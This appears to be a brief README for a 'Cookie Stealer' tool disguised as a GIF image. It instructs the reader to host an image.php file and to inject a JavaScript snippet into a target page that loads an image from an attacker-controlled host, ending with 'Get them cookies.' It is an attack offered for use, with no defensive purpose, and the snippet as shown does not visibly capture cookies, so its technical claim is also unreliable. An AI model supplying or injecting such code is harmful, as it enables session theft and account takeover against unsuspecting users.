# Cookie Stealer

A cookie stealer disguised as a gif image.

## Hot to use

Host the *image.php* file wherever you want.

Inject the code on the target

```javascript
let img = new Image();
img.src = "http://yoursite.com/image.php";
document.body.appendChild(img);
```

Get them cookies.
